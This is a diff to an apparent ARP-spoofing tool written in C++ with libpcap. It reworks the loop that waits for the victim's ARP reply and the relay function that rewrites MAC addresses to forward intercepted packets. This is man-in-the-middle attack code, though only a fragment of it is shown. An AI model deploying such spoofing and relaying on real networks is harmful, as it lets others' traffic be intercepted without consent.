@@ -35,20 +35,35 @@ EthArpPacket recv_arp(pcap_t* handle, Ip send_ip){
 	EthArpPacket *packet;
 	struct pcap_pkthdr* header;
 	const u_char * pkt_data ;
-	int res;
     int cnt = 0;
-	while((res=pcap_next_ex(handle, &header,&pkt_data))>=0){
-		if(res == 0)
-			continue;
-		packet = (EthArpPacket*)pkt_data;
-		if(packet -> eth_.type_ == htons(EthHdr::Arp) && packet -> arp_.op_ == htons(ArpHdr::Reply) && packet -> arp_.sip_ == Ip(htonl(send_ip))){
-			break;
-		}
-        cnt++;
+	while(true){
         if(cnt > 5){
             send_arp(handle,Mac(MAC_BROADCAST),my_macaddr,ArpHdr::Request,my_macaddr,my_ipaddr,Mac(MAC_NULL),send_ip);
             cnt = 0;
         }
+
+        int res = pcap_next_ex(handle, &header,&pkt_data);
+        if (res == 0) continue;
+        if (res == -1 || res == -2) {
+            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
+            break;
+        }
+
+		packet = (EthArpPacket*)pkt_data;
+        cnt++;
+        if(packet -> eth_.type_ != htons(EthHdr::Arp)){
+            continue;
+        }
+        if(packet -> arp_.op_ != htons(ArpHdr::Reply)){
+            continue;
+        }
+        if(packet -> arp_.sip_ != Ip(htonl(send_ip))){
+            continue;
+        }
+		if(packet -> eth_.type_ == htons(EthHdr::Arp) && packet -> arp_.op_ == htons(ArpHdr::Reply) && packet -> arp_.sip_ == Ip(htonl(send_ip))){
+			break;
+		}
+
 	}
 	return *packet;
 }
@@ -117,18 +132,19 @@ void arp_spoof_init(pcap_t* handle, int idx){
 
 
 void relay_packet(pcap_t *handle, packet_info* packet, int idx){
-    int len = ntohs(*((uint16_t*)(packet + 16)));
+    int len = ntohs(*((uint16_t*)((uint8_t*)packet + 16)));
     len += 18;
-
-    for(int i=0; i<6; i++){
-        if(i == 5){
-            printf("%x\n", (packet -> ethernet.ether_dhost)[i]);
-            break;
-        }
-        printf("%x.", (packet -> ethernet.ether_dhost)[i]);
-    }
-    memcpy(packet -> ethernet.ether_dhost, &(target_mac[idx]),6);
-    memcpy(packet -> ethernet.ether_shost, &my_macaddr, 6);
+    ((EthHdr*)packet) -> smac_ = my_macaddr;
+    ((EthHdr*)packet) -> dmac_ = target_mac[idx];
+    // for(int i=0; i<6; i++){
+    //     if(i == 5){
+    //         printf("%x\n", (packet -> ethernet.ether_dhost)[i]);
+    //         break;
+    //     }
+    //     printf("%x.", (packet -> ethernet.ether_dhost)[i]);
+    // }
+    // memcpy(packet -> ethernet.ether_dhost, &(target_mac[idx]),6);
+    // memcpy(packet -> ethernet.ether_shost, &my_macaddr, 6);
 
    // printf("%lx\n",*(packet -> ethernet.ether_dhost));
     //printf("%lx\n",packet -> ethernet.ether_shost);
